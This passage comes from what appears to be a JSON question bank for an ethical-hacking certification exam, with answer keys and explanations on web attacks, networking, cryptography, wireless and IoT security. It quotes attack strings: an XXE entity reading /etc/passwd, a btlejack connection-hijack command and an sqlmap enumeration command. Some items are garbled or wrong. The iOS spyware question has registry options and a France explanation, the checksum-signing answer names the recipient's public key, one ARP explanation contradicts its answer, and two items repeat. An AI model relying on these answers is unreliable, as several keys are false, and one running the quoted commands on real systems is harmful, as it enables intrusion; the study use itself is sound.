      "question": "Enabling SSI directives allows developers to add dynamic code snippets to static HTML pages without using full-fledged client or server languages. However, suppose the server is incorrectly configured (for example, allowing the exec directive) or the data is not strictly verified. In that case, an attacker can change or enter directives to perform malicious actions. What kind of known attack are we talking about?",
      "options": [
        "Server-side JS injection",
        "Server-side includes injection",
        "Server-side template injection",
        "CRLF injection"
      ],
      "correct": "B",
      "explanation": "Server-Side Includes injection attack allows the exploitation of a web application by injecting scripts in HTML pages or executing arbitrary codes remotely through manipulation of SSI in use."
    },
    {
      "q": 22,
      "type": "MCQ",
      "question": "John sends an email to his colleague Angela and wants to ensure that the message will not be changed during the delivery process. He creates a checksum of the message and encrypts it using asymmetric cryptography. What key did John use to encrypt the checksum?",
      "options": [
        "His own private key.",
        "Angela's public key.",
        "Angela's private key",
        "His own public key."
      ],
      "correct": "B",
      "explanation": "When encrypting something for Angela using asymmetric cryptography, John must use Angela's public key. Angela can then decrypt it using her private key."
    },
    {
      "q": 23,
      "type": "MCQ",
      "question": "Which of the following is an example of a scareware social engineering attack?",
      "options": [
        "A pop-up appears to a user stating, 'You have won money! Click here to claim your prize!'",
        "A pop-up appears to a user stating, 'Your computer may have been infected with spyware. Click here to install an anti-spyware tool to resolve this issue.'",
        "A banner appears to a user stating, 'Your order has been delayed. Click here to find out your new delivery date.'",
        "A banner appears to a user stating, 'Your password has expired. Click here to update your password.'"
      ],
      "correct": "B",
      "explanation": "Scareware refers to scam tactics and fake software applications that cybercriminals use to incite feelings of panic and fear, typically about malware infections."
    },
    {
      "q": 24,
      "type": "MCQ",
      "question": "Which of the following SOAP extensions apply security to Web services and maintain the integrity and confidentiality of messages?",
      "options": [
        "WS-Policy",
        "WS-Security",
        "WSDL",
        "WS-BPEL"
      ],
      "correct": "B",
      "explanation": "WS-Security is an extension to SOAP to apply security to Web services. It specifies how integrity and confidentiality can be enforced on messages."
    },
    {
      "q": 25,
      "type": "MCQ",
      "question": "The date and time of the remote host can theoretically be used against some systems to use weak time-based random number generators in other services. Which option in Zenmap will allow you to make ICMP Timestamp ping?",
      "options": [
        "-PU",
        "-PN",
        "-PY",
        "-PP"
      ],
      "correct": "D",
      "explanation": "ICMP Timestamp ping in nmap uses the -PP option to send ICMP timestamp request packets."
    },
    {
      "q": 26,
      "type": "MCQ",
      "question": "Alex, a security engineer, needs to determine how much information can be obtained from the firm's public-facing web servers. First of all, he decides to use Netcat to port 80. Which of the following did Alex do?",
      "options": [
        "Cross-site scripting.",
        "SQL injection.",
        "Cross-Site Request Forgery.",
        "Banner grabbing."
      ],
      "correct": "D",
      "explanation": "Banner Grabbing is a technique used to gain information about a computer system on a network and the services running on its open ports, often using tools like Netcat."
    },
    {
      "q": 27,
      "type": "MCQ",
      "question": "Which of the following is the type of attack that tries to overflow the CAM table?",
      "options": [
        "MAC flooding",
        "Evil twin attack",
        "DNS flood",
        "DDoS attack"
      ],
      "correct": "A",
      "explanation": "A CAM overflow attack (MAC flooding) occurs when an attacker floods the local network with random MAC addresses causing some switches to fail open in repeating mode."
    },
    {
      "q": 28,
      "type": "MCQ",
      "question": "Which term from the following describes a set of vulnerabilities that allows spyware to be installed on smartphones with the iOS operating system?",
      "options": [
        "LACNIC",
        "RIPE NCC",
        "ARIN",
        "APNIC"
      ],
      "correct": "B",
      "explanation": "RIPE NCC (R\u00e9seaux IP Europ\u00e9ens Network Coordination Centre) is the regional Internet registry for Europe, the Middle East, and parts of Central Asia, including France."
    },
    {
      "q": 29,
      "type": "MCQ",
      "question": "Which of the following is the fastest way to perform content enumeration on a web server using the Gobuster tool?",
      "options": [
        "Performing content enumeration using the brute-force mode and 10 threads.",
        "Performing content enumeration using the brute-force mode and random file extensions.",
        "Skipping SSL certificate verification.",
        "Performing content enumeration using a wordlist."
      ],
      "correct": "D",
      "explanation": "Dictionary attack (using a wordlist) is much faster than common brute-force attack. Gobuster enumerates directories and files by performing dictionary attacks."
    },
    {
      "q": 30,
      "type": "MCQ",
      "question": "What is the name of a popular tool (or rather, an entire integrated platform written in Java) based on a proxy used to assess the security of web applications and conduct practical testing using a variety of built-in tools?",
      "options": [
        "Wireshark",
        "Burp Suite",
        "Nmap",
        "CxSAST"
      ],
      "correct": "B",
      "explanation": "Burp Suite is an integrated platform/graphical tool for performing security testing of web applications with various tools working seamlessly together."
    },
    {
      "q": 31,
      "type": "MCQ",
      "question": "What is the 'wget 192.168.0.10 -q -S' command used for?",
      "options": [
        "Flooding the web server with requests to perform a DoS attack.",
        "Performing content enumeration on the web server to discover hidden folders.",
        "Using wget to perform banner grabbing on the webserver.",
        "Download all the contents of the web page locally."
      ],
      "correct": "C",
      "explanation": "The wget command with -q (quiet) and -S (print headers) options is used for banner grabbing to retrieve server information from HTTP headers."
    },
    {
      "q": 32,
      "type": "MCQ",
      "question": "Identify the type of SQL injection where attacks extend the results returned by the original query, enabling attackers to run two or more statements if they have the same structure as the original one?",
      "options": [
        "Error-based SQL Injection",
        "Union SQL injection",
        "Blind SQL Injection"
      ],
      "correct": "B",
      "explanation": "UNION-based SQL Injection extends the results returned by the original query by using the UNION operator to combine results from multiple SELECT statements."
    },
    {
      "q": 33,
      "type": "MCQ",
      "question": "Adam is a shopaholic, and he constantly surfs on the Internet in search of discounted products. The hacker decided to take advantage of this weakness of Adam and sent a fake email containing a deceptive page link to his social media page with information about a sale. Which of the following tools did the hacker probably use?",
      "options": [
        "Evilginx",
        "PyLoris",
        "XOIC",
        "sixnet-tools"
      ],
      "correct": "A",
      "explanation": "Evilginx is a man-in-the-middle attack framework used for phishing credentials and session cookies of any web service."
    },
    {
      "q": 34,
      "type": "MCQ",
      "question": "Which of the scenarios corresponds to the behaviour of the attacker: The attacker created and configured multiple domains pointing to the same host to switch quickly between the domains and avoid detection.",
      "options": [
        "Use of command-line interface.",
        "Data staging.",
        "Unspecified proxy activities.",
        "DNS tunnelling."
      ],
      "correct": "C",
      "explanation": "Unspecified Proxy Activities involve creating and configuring multiple domains pointing to the same host, allowing an attacker to switch quickly between domains to avoid detection."
    },
    {
      "q": 35,
      "type": "MCQ",
      "question": "The cyber kill chain is essentially a cybersecurity model created by Lockheed Martin. At what stage does the intruder transmit the malware via a phishing email or another medium?",
      "options": [
        "Installation",
        "Delivery",
        "Actions on Objective",
        "Weaponization"
      ],
      "correct": "B",
      "explanation": "The Delivery stage involves transmitting the weaponized malware via a phishing email or some other medium. This is the most important stage where the attack can be stopped."
    },
    {
      "q": 36,
      "type": "MCQ",
      "question": "The network administrator has received the task to eliminate all unencrypted traffic inside the company's network. During the analysis, it detected unencrypted traffic in port UDP 161. Which of the following protocols uses this port and what actions should the network administrator take?",
      "options": [
        "SNMP and he should change it to SNMP V2.",
        "CMIP and enable the encryption for CMIP.",
        "RPC and the best practice is to disable RPC completely.",
        "SNMP and he should change it to SNMP V3."
      ],
      "correct": "D",
      "explanation": "SNMP operates on UDP port 161. SNMPv1 and v2 use clear-text community strings. SNMPv3 adds both encryption and authentication options."
    },
    {
      "q": 37,
      "type": "MCQ",
      "question": "Ivan, an evil hacker, spreads Emotet malware through the malicious script. He used a tool which is a self-extracting RAR file to retrieve information related to network resources. What tool did Ivan use?",
      "options": [
        "NetPass.exe",
        "Outlook scraper",
        "Mail PassView",
        "Credential enumerator"
      ],
      "correct": "D",
      "explanation": "Credential enumerator is a self-extracting RAR file containing bypass and service components used for enumeration of network resources and brute forcing accounts."
    },
    {
      "q": 38,
      "type": "MCQ",
      "question": "This attack exploits a vulnerability that provides additional routing information in the SOAP header to support asynchronous communication. Which of the following attacks matches the description above?",
      "options": [
        "WS-Address spoofing",
        "Soap Array Attack",
        "SOAPAction spoofing",
        "XML Flooding"
      ],
      "correct": "A",
      "explanation": "WS-Address spoofing exploits the WS-Address standard which allows addition of routing information to SOAP headers, enabling asynchronous communication attacks."
    },
    {
      "q": 39,
      "type": "MCQ",
      "question": "Identify the type of fault injection attack to IoT device: During this attack attacker injects faults into the power supply or clock network.",
      "options": [
        "Frequency/voltage tampering",
        "Temperature attack",
        "Optical, EMFI, BBI",
        "Power/clock/reset glitching"
      ],
      "correct": "D",
      "explanation": "Power/Clock/Reset Glitching attacks inject faults or glitches into the power supply or clock network for remote execution and causing skipping of key instructions."
    },
    {
      "q": 40,
      "type": "MCQ",
      "question": "Identify Google advanced search operator which helps an attacker gather information about websites that are similar to a specified target URL?",
      "options": [
        "[inurl:]",
        "[related:]",
        "[link:]",
        "[site:]"
      ],
      "correct": "B",
      "explanation": "[related:] lists web pages that are similar to a specified web page."
    },
    {
      "q": 41,
      "type": "MCQ",
      "question": "Identify the wrong answer in terms of Range: 802.11a - 150 ft, 802.11b - 150 ft, 802.11n - 150 ft, 802.16 (WiMax) - 30 miles",
      "options": [
        "802.11b",
        "802.11a",
        "802.16",
        "802.11n"
      ],
      "correct": "C",
      "explanation": "802.16 (WiMax) has a range of approximately 30 miles, which is much greater than the 150 ft range of 802.11a/b/n."
    },
    {
      "q": 42,
      "type": "MCQ",
      "question": "You need to identify the OS on the attacked machine. You know that TTL: 64 and Window Size: 5840. Which is OS running on the attacked machine?",
      "options": [
        "Linux OS",
        "Mac OS",
        "Google's customized Linux",
        "Windows OS"
      ],
      "correct": "A",
      "explanation": "Based on passive OS fingerprinting, TTL of 64 and Window Size of 5840 typically indicates a Linux operating system."
    },
    {
      "q": 43,
      "type": "MCQ",
      "question": "Which of the following is the best description of The final phase of every successful hacking - Clearing tracks?",
      "options": [
        "During a cyberattack, a hacker corrupts the event logs on all machines.",
        "During a cyberattack, a hacker injects a rootkit into a server.",
        "After a system is breached, a hacker creates a backdoor.",
        "A hacker gains access to a server through an exploitable vulnerability."
      ],
      "correct": "A",
      "explanation": "Clearing tracks involves clearing all kinds of logs and malicious malware related to the attack. Corrupting event logs is part of this final phase."
    },
    {
      "q": 44,
      "type": "MCQ",
      "question": "Ivan, a black hacker, wants to get information about IoT cameras and devices. Which of the following tools did Ivan use?",
      "options": [
        "Wapiti",
        "Lacework",
        "NeuVector",
        "Censys"
      ],
      "correct": "D",
      "explanation": "Censys provides an automated monitoring solution to scan networks for IoT devices and exposures, constantly monitoring every available server and device on the internet."
    },
    {
      "q": 45,
      "type": "MCQ",
      "question": "Which of the following types of threat intelligence will you use to enter information about threats into security devices in digital format?",
      "options": [
        "Tactical threat intelligence.",
        "Strategic threat intelligence.",
        "Operational threat intelligence.",
        "Technical threat intelligence."
      ],
      "correct": "D",
      "explanation": "Technical threat intelligence provides information about attacker's resources in digital format that can be fed directly into security devices to block and identify malicious traffic."
    },
    {
      "q": 46,
      "type": "MCQ",
      "question": "During testing, you discovered a vulnerability that allows hackers to gain unauthorized access to API objects. Which of the following API vulnerabilities have you found?",
      "options": [
        "Code Injections.",
        "No ABAC validation.",
        "Business Logic Flaws.",
        "RBAC Privilege Escalation."
      ],
      "correct": "B",
      "explanation": "No ABAC (Attribute-Based Access Control) validation allows attackers to gain unauthorized access to API objects or perform actions such as viewing, updating, or deleting."
    },
    {
      "q": 47,
      "type": "MCQ",
      "question": "Which of the following algorithms is a symmetric key block cipher with a block size of 128 bits representing a 32-round SP-network?",
      "options": [
        "SHA-256",
        "CAST-128",
        "Serpent",
        "RC4"
      ],
      "correct": "C",
      "explanation": "Serpent is a symmetric key block cipher with a block size of 128 bits and is a 32-round substitution-permutation network operating on a block of four 32-bit words."
    },
    {
      "q": 48,
      "type": "MCQ",
      "question": "Andrew, an evil hacker, research the website and finds a web page that indicates the application is potentially vulnerable to Server-side Includes Injection. Which web-page file type did Andrew find?",
      "options": [
        ".cms",
        ".stm",
        ".html",
        ".rss"
      ],
      "correct": "B",
      "explanation": "It is possible to check if the application is vulnerable to SSI by verifying the presence of pages with extension .stm, .shtm and .shtml."
    },
    {
      "q": 49,
      "type": "MCQ",
      "question": "Black-hat hacker Ivan attacked the SCADA system. He discovered outdated equipment, HMI directly connected to Internet with no security. What category does this vulnerability belong to?",
      "options": [
        "Lack of Authorization/Authentication and Insecure Defaults.",
        "Code Injection.",
        "Memory Corruption.",
        "Credential Management."
      ],
      "correct": "A",
      "explanation": "Lack of authorization/authentication and insecure defaults includes vulnerabilities like insecure defaults, missing encryption, and absence of authentication mechanisms."
    },
    {
      "q": 50,
      "type": "MCQ",
      "question": "Identify what the following code is used for: Script that fills array with 'A's and sends them to victim.",
      "options": [
        "Brute-force",
        "Heap spraying",
        "Buffer Overflow",
        "Buffer over-read"
      ],
      "correct": "C",
      "explanation": "The code shows a loop that fills up an array with 'A's in each iteration and sends them to the victim, which is a typical buffer overflow attack pattern."
    },
    {
      "q": 51,
      "type": "MCQ",
      "question": "The attacker disabled security controls of NetNTLMv1 and extracted non-network logon tokens to masquerade as legitimate user. Which attack was performed?",
      "options": [
        "Dictionary attack",
        "Rainbow table attack",
        "Internal monologue attack",
        "Phishing attack"
      ],
      "correct": "C",
      "explanation": "Internal monologue attack allows NTLMv1 challenge-response hashes to be obtained by disabling security controls and extracting logon tokens without touching LSASS."
    },
    {
      "q": 52,
      "type": "MCQ",
      "question": "The attacker sent fraudulent email with malicious attachment that injected malware into software and propagated to networked systems. Which attack technique was used?",
      "options": [
        "Spear-phishing attack",
        "HMI-based attack",
        "Reconnaissance attack",
        "SMishing attack"
      ],
      "correct": "A",
      "explanation": "Spear phishing involves sending fake emails with malicious attachments that inject malware when opened, which then propagates to networked systems."
    },
    {
      "q": 53,
      "type": "MCQ",
      "question": "Which Kubernetes component can assign nodes based on overall resource requirement, data locality, and policy restrictions?",
      "options": [
        "Kube-scheduler",
        "Kube-controller-manager",
        "cloud-controller-manager",
        "Kube-apiserver"
      ],
      "correct": "A",
      "explanation": "Kube-scheduler is a master component that scans newly generated pods and allocates nodes based on resource requirements, data locality, and policy restrictions."
    },
    {
      "q": 54,
      "type": "MCQ",
      "question": "What is the name of DDoS attack that bypasses security by disguising as valid TCP session with SYN, ACK, and RST packets?",
      "options": [
        "Spoofed session flood attack.",
        "UDP flood attack.",
        "Peer-to-peer attack.",
        "Ping-of-death attack."
      ],
      "correct": "A",
      "explanation": "Spoofed session flood attack emulates TCP sessions with fake SYN, multiple ACK, and FIN/RST packets to bypass security tools that only analyze incoming traffic."
    },
    {
      "q": 55,
      "type": "MCQ",
      "question": "In this security model, every user maintains a ring of public keys and encrypts messages using receiver's public key. What is this model?",
      "options": [
        "Web of trust",
        "Transport Layer Security",
        "Zero trust security model",
        "Secure Socket Layer"
      ],
      "correct": "A",
      "explanation": "A web of trust is a concept where each user has a ring of public keys and encrypts information with recipient's public key, used in PGP and OpenPGP systems."
    },
    {
      "q": 56,
      "type": "MCQ",
      "question": "Attackers can query DNS server to determine if specific DNS record is cached, revealing browsing habits. Which attack is this?",
      "options": [
        "DNSSEC zone walking",
        "DNS zone walking",
        "DNS cache snooping",
        "DNS cache poisoning"
      ],
      "correct": "C",
      "explanation": "DNS cache snooping is when someone queries a DNS server to find out if it has a specific DNS record cached, thereby deducing recent browsing history."
    },
    {
      "q": 57,
      "type": "MCQ",
      "question": "Ivan installed rogue AP with only WPA2 to force victim to use older encryption. Which attack does Ivan want to perform?",
      "options": [
        "Downgrade security attack",
        "Side-channel attack",
        "Cache-based attack",
        "Timing-based attack"
      ],
      "correct": "A",
      "explanation": "Downgrade security attack forces users to use older encryption methods like WPA2 instead of WPA3 by installing rogue AP with only WPA2 compatibility."
    },
    {
      "q": 58,
      "type": "MCQ",
      "question": "Attacker wants to draw map of target organization's network infrastructure. Which will allow him to do this?",
      "options": [
        "Vulnerability analysis",
        "Malware analysis",
        "Network enumeration",
        "Scanning networks"
      ],
      "correct": "D",
      "explanation": "Network mapping/scanning is the process of visualizing all devices on network and how they're connected, creating a topology view of the network."
    },
    {
      "q": 59,
      "type": "MCQ",
      "question": "You want to prevent SQLi attacks. You decide to use practice whereby only approved entities are accepted. Which practice?",
      "options": [
        "Enforce least privileges.",
        "Blacklist validation.",
        "Whitelist validation.",
        "Output encoding."
      ],
      "correct": "C",
      "explanation": "Whitelist validation is a best practice whereby only the list of entities (data type, range, size, value) that have been approved for secured access is accepted."
    },
    {
      "q": 60,
      "type": "MCQ",
      "question": "Which of the following services is running on port 21 by default?",
      "options": [
        "Domain Name System",
        "Border Gateway Protocol",
        "Service Location Protocol",
        "File Transfer Protocol"
      ],
      "correct": "D",
      "explanation": "Port 21 is used by File Transfer Protocol (FTP) by default for control connection."
    },
    {
      "q": 61,
      "type": "MCQ",
      "question": "Which Metasploit post-exploitation module is used to escalate privileges on systems?",
      "options": [
        "keylogrecorder",
        "getsystem",
        "getuid",
        "autoroute"
      ],
      "correct": "B",
      "explanation": "Metasploit has a Meterpreter script, getsystem, that will use different techniques to attempt to gain SYSTEM level privileges on the remote system."
    },
    {
      "q": 62,
      "type": "MCQ",
      "question": "There is a powerful tool written in Go for MITM attack using arp spoofing. What tool?",
      "options": [
        "DerpNSpoof",
        "Gobbler",
        "Wireshark",
        "BetterCAP"
      ],
      "correct": "D",
      "explanation": "BetterCAP is a powerful framework written in Go which aims to offer an all-in-one solution for performing reconnaissance and MITM attacks including ARP spoofing."
    },
    {
      "q": 63,
      "type": "MCQ",
      "question": "Identify technique for detecting honeypots using time-based TCP fingerprinting methods. Which honeypot?",
      "options": [
        "Detecting Snort_inline honeypots.",
        "Detecting UML Honeypot.",
        "Detecting Honeyd honeypots.",
        "Detecting Sebek-based honeypots."
      ],
      "correct": "C",
      "explanation": "Honeyd honeypots can be identified by performing time-based TCP fingerprinting methods to validate response differences."
    },
    {
      "q": 64,
      "type": "MCQ",
      "question": "Password recovery mechanism has weak security questions. What CWE category?",
      "options": [
        "Insecure transmission of credentials.",
        "Verbose failure messages.",
        "User impersonation.",
        "Weak password recovery mechanism."
      ],
      "correct": "D",
      "explanation": "Weak password recovery mechanism is when the security question is too easy to guess or implementation allows bypassing authentication through recovery process."
    },
    {
      "q": 65,
      "type": "MCQ",
      "question": "Tool to scan website and create wordlist for password attacks?",
      "options": [
        "Psiphon",
        "Orbot",
        "CeWL",
        "Shadowsocks"
      ],
      "correct": "C",
      "explanation": "CeWL is a ruby app which spiders a given URL to create a wordlist from the website content that can be used for password crackers."
    },
    {
      "q": 66,
      "type": "MCQ",
      "question": "Rajesh scans networks without permission, informs owners, but publishes if ignored. What type of hacker?",
      "options": [
        "Gray hat",
        "Cybercriminal",
        "White hat",
        "Black hat"
      ],
      "correct": "A",
      "explanation": "Grey hat hackers look for vulnerabilities without owner's permission. If issues are found, they report them, and if ignored, may publish exploits."
    },
    {
      "q": 67,
      "type": "MCQ",
      "question": "Alexa on public Wi-Fi. How verify no ARP spoofing attack on her laptop?",
      "options": [
        "Scan network with Nmap for duplicate MACs",
        "Can't identify, must use VPN",
        "Check ARP table for one IP with two different MAC addresses",
        "Use netstat for suspicious connections"
      ],
      "correct": "C",
      "explanation": "You can check ARP table using 'arp -a' command. If table contains two different IP addresses sharing same MAC address, ARP poisoning is occurring."
    },
    {
      "q": 68,
      "type": "MCQ",
      "question": "Attacker uses btlejack to hijack BLE connections. Which command hijacks connections?",
      "options": [
        "btlejack -d /dev/ttyACM0 -d /dev/ttyACM2 -s",
        "btlejack -f 0x9c68fd30 -t -m 0x1fffffffff",
        "btlejack -c any",
        "btlejack -s"
      ],
      "correct": "B",
      "explanation": "The command 'btlejack -f 0x9c68fd30 -t -m 0x1fffffffff' is used to hijack/take over BLE connections after they've been captured."
    },
    {
      "q": 69,
      "type": "MCQ",
      "question": "Which vulnerability scanner combines static and dynamic security checks for XSS, SQLi, etc?",
      "options": [
        "Saleae Logic Analyzer",
        "Syhunt Hybrid",
        "Cisco ASA",
        "AT&T USM Anywhere"
      ],
      "correct": "B",
      "explanation": "Syhunt Hybrid combines comprehensive static and dynamic security scans to detect vulnerabilities like XSS, File Inclusion, SQL Injection through Hybrid-Augmented Analysis."
    },
    {
      "q": 70,
      "type": "MCQ",
      "question": "Ivan plugged rogue switch with lower priority to become root bridge and sniff traffic. What attack?",
      "options": [
        "VLAN hopping.",
        "ARP spoofing.",
        "DNS poisoning.",
        "STP attack."
      ],
      "correct": "D",
      "explanation": "STP attack involves spoofing the root bridge by broadcasting STP BPDU with lower bridge priority to force STP recalculation and become root bridge."
    },
    {
      "q": 71,
      "type": "MCQ",
      "question": "Which logging framework had vulnerability in December 2021 affecting millions of Java applications?",
      "options": [
        "Log4J",
        "Logback",
        "SLF4J",
        "Apache Commons Logging"
      ],
      "correct": "A",
      "explanation": "In December 2021, a vulnerability in Log4J logging service (CVE-2021-44228) was discovered that could compromise millions of Java-based applications."
    },
    {
      "q": 72,
      "type": "MCQ",
      "question": "You collected threat information from humans, social media, chat rooms about malicious activities. What type of threat intelligence?",
      "options": [
        "Tactical threat intelligence.",
        "Strategic threat intelligence.",
        "Technical threat intelligence.",
        "Operational threat intelligence."
      ],
      "correct": "D",
      "explanation": "Operational threat intelligence provides info about specific threats, collected from humans, social media, and events that lead to cyber-attacks."
    },
    {
      "q": 73,
      "type": "MCQ",
      "question": "Identify technology: open-source for developing, packaging, running applications via OS-level virtualization, delivers containerized software packages.",
      "options": [
        "Serverless computing",
        "Paravirtualization",
        "Docker",
        "Virtual machine"
      ],
      "correct": "C",
      "explanation": "Docker is a set of PaaS products that use OS-level virtualization to deliver software in packages called containers."
    },
    {
      "q": 74,
      "type": "MCQ",
      "question": "Which Nmap flag allows scanning with spoofed source IP addresses as decoys?",
      "options": [
        "-D",
        "-S",
        "-f",
        "-A"
      ],
      "correct": "A",
      "explanation": "-D (decoy) causes a decoy scan making it appear that multiple IP addresses are scanning the target, hiding the real scanner's IP address."
    },
    {
      "q": 75,
      "type": "MCQ",
      "question": "Which Nmap parameter determines service protocol, application name, version number, hostname, device type?",
      "options": [
        "-sS",
        "-sV",
        "-sT",
        "-sY"
      ],
      "correct": "B",
      "explanation": "-sV enables version detection which interrogates ports to determine service protocol, application name, version, hostname, and device type."
    },
    {
      "q": 76,
      "type": "MCQ",
      "question": "IH&R team analyzes compromised device to find attack type, severity, target, impact. What incident handling phase?",
      "options": [
        "Eradication.",
        "Preparation.",
        "Incident triage.",
        "Incident recording and assignment."
      ],
      "correct": "C",
      "explanation": "Incident triage phase involves analyzing, validating, categorizing incidents and finding details like attack type, severity, target, and impact."
    },
    {
      "q": 77,
      "type": "MCQ",
      "question": "Technology creates safe encrypted tunnel over public network for remote work. Which technology?",
      "options": [
        "VPN",
        "Split tunneling",
        "DMZ",
        "Bastion host"
      ],
      "correct": "A",
      "explanation": "A VPN (Virtual Private Network) creates a safe and encrypted tunnel over public networks to securely send and receive sensitive information."
    },
    {
      "q": 78,
      "type": "MCQ",
      "question": "What does 'sqlmap.py -u \"http://10.10.37.12/?p=1&forumaction=search\" --dbs' command do?",
      "options": [
        "Creating backdoors using SQL injection.",
        "Enumerating the databases in the DBMS for the URL.",
        "Retrieving SQL statements being executed.",
        "Searching database statements at IP address."
      ],
      "correct": "B",
      "explanation": "The --dbs parameter in sqlmap enumerates/lists all databases in the DBMS for the given URL."
    },
    {
      "q": 79,
      "type": "MCQ",
      "question": "Specialist will extract source code and disassemble mobile app to analyze design flaws. Which technique?",
      "options": [
        "Jailbreaking.",
        "Reverse engineering.",
        "Rooting.",
        "Application sandboxing."
      ],
      "correct": "B",
      "explanation": "Reverse engineering is the process of understanding how software accomplishes tasks by deductive reasoning to find vulnerabilities and improve security."
    },
    {
      "q": 80,
      "type": "MCQ",
      "question": "Attacker wants to map target network infrastructure. Which allows this?",
      "options": [
        "Vulnerability analysis",
        "Malware analysis",
        "Network enumeration",
        "Scanning networks"
      ],
      "correct": "D",
      "explanation": "Network mapping/scanning visualizes all devices on network and creates topology views showing how networks are structured."
    },
    {
      "q": 81,
      "type": "MCQ",
      "question": "Which malware spreads from system to system causing damage like viruses?",
      "options": [
        "Worm",
        "Rootkit",
        "Adware",
        "Trojan"
      ],
      "correct": "A",
      "explanation": "A computer worm is standalone malware that replicates itself to spread to other computers, often using networks and security failures."
    },
    {
      "q": 82,
      "type": "MCQ",
      "question": "In which attack is this line injected: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
      "options": [
        "XXS",
        "IDOR",
        "XXE",
        "SQLi"
      ],
      "correct": "C",
      "explanation": "XXE (XML External Entity) injection allows attackers to interfere with XML data processing and view files on the server filesystem."
    },
    {
      "q": 83,
      "type": "MCQ",
      "question": "At which Cyber Kill Chain step is malware weapon created, like malicious file disguised as spreadsheet?",
      "options": [
        "Reconnaissance",
        "Exploitation",
        "Delivery",
        "Weaponization"
      ],
      "correct": "D",
      "explanation": "Weaponization step involves creating malware weapon like a virus or malicious file to exploit target vulnerabilities."
    },
    {
      "q": 84,
      "type": "MCQ",
      "question": "Method using search engines to search for photographs, profile pictures, and memes?",
      "options": [
        "Google advanced search",
        "Google dorking",
        "Reverse image search",
        "Metasearch engines"
      ],
      "correct": "C",
      "explanation": "Reverse image search is a CBIR technique that involves providing a sample image to search for related, similar, or identical images."
    },
    {
      "q": 85,
      "type": "MCQ",
      "question": "Ivan poisoned DNS cache redirecting traffic to phishing site. Users entered credentials. Which attack?",
      "options": [
        "SPIT attack",
        "Spear-phishing",
        "Pharming",
        "Phishing"
      ],
      "correct": "C",
      "explanation": "Pharming is an attack where DNS infrastructure is corrupted causing users to be misdirected to fraudulent websites without their knowledge."
    },
    {
      "q": 86,
      "type": "MCQ",
      "question": "Lisandro exploited OTA programming vulnerability on Android to intercept traffic. What attack type?",
      "options": [
        "Bypass SSL pinning.",
        "Advanced SMS phishing.",
        "Tap 'n ghost attack.",
        "Social engineering."
      ],
      "correct": "B",
      "explanation": "Advanced SMS Phishing exploits OTA provisioning (OMA CP) to send deceptive messages that route Internet traffic through attacker's proxy server."
    },
    {
      "q": 87,
      "type": "MCQ",
      "question": "In which cloud service model do you take full responsibility for maintenance of cloud-based resources?",
      "options": [
        "PaaS",
        "IaaS",
        "SaaS",
        "BaaS"
      ],
      "correct": "B",
      "explanation": "IaaS (Infrastructure as a Service) provides infrastructure resources that customers provision, configure and maintain, taking full responsibility."
    },
    {
      "q": 88,
      "type": "MCQ",
      "question": "Which tool can NOT be used for password hash cracking?",
      "options": [
        "Hashcat",
        "Netcat",
        "Ophcrack",
        "John the Ripper"
      ],
      "correct": "B",
      "explanation": "Netcat is a networking utility for TCP/UDP connections and port scanning, not for password hash cracking."
    },
    {
      "q": 89,
      "type": "MCQ",
      "question": "Ivan scans network for IoT devices using default credentials. Which tool?",
      "options": [
        "IoTSeeker",
        "Cloud IoT Core",
        "Bullguard IoT",
        "Azure IoT Central"
      ],
      "correct": "A",
      "explanation": "IoTSeeker scans networks for specific types of IoT devices to detect if they're using default, factory-set credentials."
    },
    {
      "q": 90,
      "type": "MCQ",
      "question": "Company wants to move to another CSP. Which can become a problem?",
      "options": [
        "Lock-in",
        "Lock-up",
        "Lock-down",
        "Virtualization"
      ],
      "correct": "A",
      "explanation": "Vendor lock-in is when customers are dependent on a single CSP and cannot easily move to different vendor without substantial costs."
    },
    {
      "q": 91,
      "type": "MCQ",
      "question": "Which standard most applicable for major credit card company?",
      "options": [
        "Sarbanes-Oxley Act",
        "HIPAA",
        "PCI-DSS",
        "FISMA"
      ],
      "correct": "C",
      "explanation": "PCI-DSS (Payment Card Industry Data Security Standard) is the information security standard for organizations that handle branded credit cards."
    },
    {
      "q": 92,
      "type": "MCQ",
      "question": "Which Nmap parameter helps evade IDS or firewalls?",
      "options": [
        "-A",
        "-T",
        "-R",
        "-r"
      ],
      "correct": "B",
      "explanation": "-T option provides timing templates (0-5) where paranoid and sneaky modes are specifically for IDS evasion."
    },
    {
      "q": 93,
      "type": "MCQ",
      "question": "Which rootkit adds code or replaces portions of core OS to obscure backdoor?",
      "options": [
        "User-mode rootkit.",
        "Hypervisor-level rootkit.",
        "Kernel-level rootkit.",
        "Application-level Rootkit."
      ],
      "correct": "C",
      "explanation": "Kernel-level rootkits are created by adding additional code or replacing portions of the core OS with modified code via device drivers or kernel modules."
    },
    {
      "q": 94,
      "type": "MCQ",
      "question": "Test network from attacker's POV using firewalls, routers, servers. What assessment type?",
      "options": [
        "External assessment",
        "Passive assessment",
        "Active Assessments",
        "Host-based Assessments"
      ],
      "correct": "A",
      "explanation": "External assessment assesses the network from hacker's point of view to find exploits and vulnerabilities accessible to outside world using external devices."
    },
    {
      "q": 95,
      "type": "MCQ",
      "question": "Which attack uses Wi-Fi Pineapple to run AP with legitimate-looking SSID?",
      "options": [
        "Wardriving attack",
        "MAC spoofing attack",
        "Phishing attack",
        "Evil-twin attack"
      ],
      "correct": "D",
      "explanation": "Evil-twin attack uses rogue AP (like Wi-Fi Pineapple) with legitimate-looking SSID to conduct man-in-the-middle attacks."
    },
    {
      "q": 96,
      "type": "MCQ",
      "question": "Which antenna commonly used for frequency band 10 MHz to VHF and UHF?",
      "options": [
        "Omnidirectional antenna",
        "Parabolic grid antenna",
        "Dipole antenna",
        "Yagi antenna"
      ],
      "correct": "D",
      "explanation": "Yagi-Uda antenna is a directional antenna commonly used for HF, VHF and UHF bands with high gain in unidirectional beam pattern."
    },
    {
      "q": 97,
      "type": "MCQ",
      "question": "Which tool determines WPS-enabled access points?",
      "options": [
        "wash",
        "net view",
        "macof",
        "ntptrace"
      ],
      "correct": "A",
      "explanation": "Wash is a utility for identifying WPS enabled access points and displaying their main characteristics."
    },
    {
      "q": 98,
      "type": "MCQ",
      "question": "Technique that assumes user is not authentic by default and verifies every connection. What technique?",
      "options": [
        "Container technology",
        "Zero trust network",
        "Serverless computing",
        "DMZ"
      ],
      "correct": "B",
      "explanation": "Zero Trust Network Access (ZTNA) assumes by default that users are not authentic and verifies every incoming connection before allowing access."
    },
    {
      "q": 99,
      "type": "MCQ",
      "question": "SQLi type that doesn't show errors but returns true/false responses. Which type?",
      "options": [
        "Union SQLi",
